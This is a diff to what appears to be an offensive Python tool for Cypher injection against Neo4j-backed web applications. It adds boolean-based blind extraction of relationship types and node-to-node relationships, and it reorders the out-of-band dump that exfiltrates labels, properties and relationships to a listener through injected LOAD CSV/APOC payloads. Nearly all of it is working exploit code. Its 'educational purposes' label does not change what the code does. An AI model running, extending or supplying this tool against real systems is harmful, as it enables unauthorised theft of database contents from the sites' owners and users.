@@ -239,7 +239,7 @@ class oob_Neo4jInjector:
         try:
             response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
             if response.status_code == 302:
-                print(colored("302 Redirect, Cookies Expired/Invalid ?", "red"))
+                print(colored("[!] WARNING, 302 Redirect, Cookies Expired/Invalid ?", "red"))
                 sys.exit()
             return response  # Return the response object
         except requests.exceptions.RequestException as e:
@@ -391,23 +391,38 @@ class oob_Neo4jInjector:
 
         return parsed_data
         
+
+    def oob_dump_all(self):
+        labels = self.dump_labels()
+        for label in labels:
+            properties = self.dump_properties(label)
+            properties_dict = {}
+            for pr0perty in properties:
+                parsed_data = self.dump_values(label, pr0perty)
+                properties_dict.update(parsed_data)
+            node_count = self.dump_node_count(label)
+
+            formatted_dict = fully_dynamic_convert_data(properties_dict)
+            write_json_to_file(formatted_dict, f'{label}.json')
+            convert_dict_to_table(formatted_dict)
+
     def exfil_relationship(self):
 
-        print("\n[*] Using LOAD CSV to Exfiltrate Relationships [*]")
+        print("\n[*] Exfiltrating Relationships")
         # dump relationship count
         self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COUNT(DISTINCT(type(relationship))) as exfilData {self.exfil_payload}")
 
-        relationship_count = get_data()  
+        rel_type_counts = get_data()  
 
-        if relationship_count is None or relationship_count == '0':
-            print(colored("[!] The database might not have any relationships. Exiting...", "red"))
+        if rel_type_counts is None or rel_type_counts == '0':
+            print(colored("[!] WARNING, The database might not have any relationships. Exiting...", "red"))
             sys.exit()
 
         # dump relationships type
         self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
 
         
-        print(f"\n[*] relationships types [{relationship_count}]:")
+        print(f"\n[*] relationships types [{rel_type_counts}]:")
         relationships = get_data().split('::')
         for relationship in relationships:
             print(f"[+] {relationship}")
@@ -441,23 +456,6 @@ class oob_Neo4jInjector:
                 if regex_rel_type == rel_type:
                     print(f"[++] {relationship}")
 
-
-    def oob_dump_all(self):
-        labels = self.dump_labels()
-        for label in labels:
-            properties = self.dump_properties(label)
-            properties_dict = {}
-            for pr0perty in properties:
-                parsed_data = self.dump_values(label, pr0perty)
-                properties_dict.update(parsed_data)
-            node_count = self.dump_node_count(label)
-
-            formatted_dict = fully_dynamic_convert_data(properties_dict)
-            write_json_to_file(formatted_dict, f'{label}.json')
-
-            
-            convert_dict_to_table(formatted_dict)
-        self.exfil_relationship()
 
 
     def clean_up(self):
@@ -599,9 +597,8 @@ class ib_Neo4jInjector:
             anim_index += 1
             for response in responses:
                 if (self.check_true(response)):
+                    print(" " * 50, end='\r')
                     return count_index
-        print(" " * 50, end='\r')
-        return 0
 
     def find_label_sizes(self, label_count):
         animation = "|/-\\"
@@ -849,6 +846,183 @@ class ib_Neo4jInjector:
         value_sizes_dict = self.find_value_size(value_counts_dict)
         values = self.dump_value(value_sizes_dict)
 
+    def find_rel_type_counts(self):
+        animation = "|/-\\"
+        anim_index = 0
+        for count_index in range(1000):
+            if count_index == 999:
+                print(colored("[!] WARNING, The database might not have any relationships. Exiting...", "red"))
+                sys.exit()
+            responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (node1)-[relationship]-(node2) RETURN DISTINCT(type(relationship))}} = {count_index}"))
+            print(f"[{animation[anim_index % len(animation)]}] dumping relationship type counts, might take awhile", end='\r', flush=True)
+            anim_index += 1
+            for response in responses:
+                if (self.check_true(response)):
+                    print(" " * 150, end='\r')
+                    return count_index
+
+    def find_rel_type_sizes(self, rel_type_counts):
+        animation = "|/-\\"
+        anim_index = 0
+        rel_type_sizes_dict = {}
+        for count_index in range(rel_type_counts):
+            break_flag = False
+            for size_index in range(1000):
+                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
+                print(f"[{animation[anim_index % len(animation)]}] dumping relationship type sizes, might take awhile", end='\r', flush=True)
+                anim_index += 1
+                for response in responses:
+                    break_flag = self.check_true(response)
+                    if (break_flag):
+                        rel_type_sizes_dict[count_index] = size_index
+                        break
+                if (break_flag):
+                    break
+        print(" " * 150, end='\r')
+        return rel_type_sizes_dict
+
+    def dump_rel_types(self, rel_type_sizes_dict):
+        print(f"\n[*] available relationship [{len(rel_type_sizes_dict)}]")
+        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
+        rel_types = []
+        animation = "|/-\\"
+        anim_index = 0
+        for count_index, size in rel_type_sizes_dict.items():
+            rel_type = ''
+            for size_index in range(size):
+                break_flag = False
+                for char in valid_chars:
+                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                    print(f"[{animation[anim_index % len(animation)]}] building relationship type: {rel_type}{char}", end='\r', flush=True)
+                    anim_index += 1
+                    for response in responses:
+                        break_flag = self.check_true(response)
+                        if (break_flag):
+                            rel_type += char
+                            break
+                    if (break_flag):
+                        break
+            print(" " * 150, end='\r')
+            print(f"[+] {rel_type}")
+            rel_types.append(rel_type)
+        return rel_types
+
+    def find_rel_counts(self, rel_types):
+        rel_counts_dict = {}
+        animation = "|/-\\"
+        anim_index = 0
+        for rel_type in rel_types:
+            break_flag = False
+            for count_index in range(1000):
+                responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 RETURN label1 + ':' + toString(id(node1)) + ':{rel_type}:' + label2 + ':' + toString(id(node2))}} = {count_index}"))
+                print(f"[{animation[anim_index % len(animation)]}] dumping id to id relationship counts, might take awhile", end='\r', flush=True)
+                anim_index += 1
+                for response in responses:
+                    break_flag = self.check_true(response)
+                    if (break_flag):
+                        rel_counts_dict[rel_type] = count_index
+                        break
+                if (break_flag):
+                    break
+        print(" " * 150, end='\r')
+        return rel_counts_dict
+
+    def find_rel_sizes(self, rel_counts_dict):
+        rel_sizes_dict = {}
+        animation = "|/-\\"
+        anim_index = 0
+        for rel_type, count in rel_counts_dict.items():
+            for count_index in range(count):
+                break_flag = False 
+                for size_index in range(1000):
+                    # Construct and send your query
+                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + toString(id(node1)) + ':{rel_type}:' + label2 + ':' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
+                    print(f"[{animation[anim_index % len(animation)]}] dumping relationship sizes, might take awhile", end='\r', flush=True)
+                    anim_index += 1
+                    for response in responses:
+                        break_flag = self.check_true(response)
+                        if (break_flag):
+                                if rel_type not in rel_sizes_dict:
+                                    rel_sizes_dict[rel_type] = {}
+                                # Now that we're sure label exists in value_counts, record the count
+                                rel_sizes_dict[rel_type][count_index] = size_index
+                                break  # Stop searching after finding the blind string for this property
+                    if (break_flag):
+                        break
+        print(" " * 150, end='\r')
+        return rel_sizes_dict
+
+    def dump_rel(self, rel_sizes_dict):
+        print(colored(f"\n[!] At this stage, we are unaware relationship direction, we have to verify it", "yellow"))
+        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
+        rels_dict = {}
+        animation = "|/-\\"
+        anim_index = 0
+        for rel_type, size_dict in rel_sizes_dict.items():
+            print(f"[*] available relationship [{len(size_dict)}]:")
+            print(f"[+] relationship: {rel_type}")
+            for count_index, size in size_dict.items():
+                rel = ''
+                for size_index in range(size):
+                    break_flag = False
+                    for char in valid_chars:
+                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + toString(id(node1)) + ':{rel_type}:' + label2 + ':' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
+                        print(f"[{animation[anim_index % len(animation)]}] building relationship: {rel}{char}", end='\r', flush=True)
+                        anim_index += 1
+                        for response in responses:
+                            break_flag = self.check_true(response)
+                            if (break_flag):
+                                    rel += char
+                                    break 
+                        if (break_flag):
+                            break
+                print(" " * 150, end='\r') 
+                print(f"[++] {rel}")
+                rels_dict[rel_type] = rel
+        return rels_dict 
+
+    def verify_rels(self, rels_dict):
+        animation = "|/-\\"
+        anim_index = 0
+        verified_rels = []
+        for rel_type, rel in rels_dict.items():
+            rel_parts = rel.split(':')
+            label1, id1, rel_type, label2, id2 = rel_parts[0], rel_parts[1], rel_parts[2], rel_parts[3], rel_parts[4]
+            break_flag = False
+            for id_from, id_to in [(id1, id2), (id2, id1)]:
+                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2 RETURN 1 }}"))
+                print(f"[{animation[anim_index % len(animation)]}] verifying relationships:", end='\r', flush=True)
+                anim_index += 1
+                for response in responses:
+                    break_flag = self.check_true(response)
+                    if (break_flag):
+                            verified_rels.append(f"{label1}:{id1}-[:{rel_type}]->{label2}:{id2}")
+                            break 
+                if (break_flag):
+                    break
+                print(" " * 150, end='\r') 
+
+        print(f"\n[*] available relationships [{len(verified_rels)}]")
+        
+        for rel_type in rels_dict.keys():
+            print(f"[+] {rel_type}")
+            for rel in verified_rels:
+                regex_rel_type = re.findall(r"\[:([^\]]+)\]", rel)[0]
+                if regex_rel_type == rel_type:
+                    print(f"[++] {rel}")
+
+        return verified_rels
+
+    def ib_dump_rel_types(self):
+        rel_type_counts = self.find_rel_type_counts()
+        rel_type_sizes_dict = self.find_rel_type_sizes(rel_type_counts)
+        rel_types  = self.dump_rel_types(rel_type_sizes_dict)
+        rel_counts_dict = self.find_rel_counts(rel_types)
+        rel_sizes_dict = self.find_rel_sizes(rel_counts_dict)
+        rels = self.dump_rel(rel_sizes_dict)
+        verified_rels = self.verify_rels(rels)
+        
+
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
@@ -860,8 +1034,8 @@ def main():
     parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
 
 
-    parser.add_argument("--out-of-band", action="store_true", help="Enable out-of-band (OOB) mode")
-    parser.add_argument("--in-band", action="store_true", help="Enable in-band (IB) mode")
+    parser.add_argument("--out-of-band", action="store_true", help="Enable out-of-band (OOB) mode, uses LOADCSV/APOC version of it")
+    parser.add_argument("--in-band", action="store_true", help="Enable in-band (IB) mode, uses boolean based injection")
 
     parser.add_argument("--dump-all", action="store_true", help="Dumps all data")
     parser.add_argument("--labels", action="store_true", help="Dump labels")
@@ -916,10 +1090,12 @@ def main():
                 listener.stop_listener()
                 listener_thread.join()
                 return
+
         injector.get_version()
             
         if args.dump_all:
             injector.oob_dump_all()
+            injector.exfil_relationship()
 
         elif args.labels:
             labels = injector.dump_labels()
@@ -938,7 +1114,7 @@ def main():
             write_json_to_file(formatted_dict, f'{args.label}.json')
             convert_dict_to_table(formatted_dict)
 
-        elif args.relationships:
+        if not (args.relationships and args.dump_all):
             injector.exfil_relationship()
 
         injector.clean_up()
@@ -975,7 +1151,6 @@ def main():
             properties_dict = injector.dump_properties(property_sizes_dict)
 
         if args.label and args.property:
-            # yet to handle multiple label, multiple properties
             properties_dict = {}
             labels = args.label.split(',')
             properties = args.property.split(',')
@@ -988,13 +1163,12 @@ def main():
             value_counts_dict = injector.find_value_count(properties_dict)
             value_sizes_dict = injector.find_value_size(value_counts_dict)
             values = injector.dump_value(value_sizes_dict)
+        injector.ib_dump_rel_types()
+
+        if args.relationships:
+            injector.exfil_relationship()
     else:
         print(colored("Choose: [--in-band/--out-of-band]", "red"))
-
-    #injector.exfil_data()
-    # injector.exfil_relationship()
-    # injector.clean_up()
-
 
 if __name__ == "__main__":
     main()
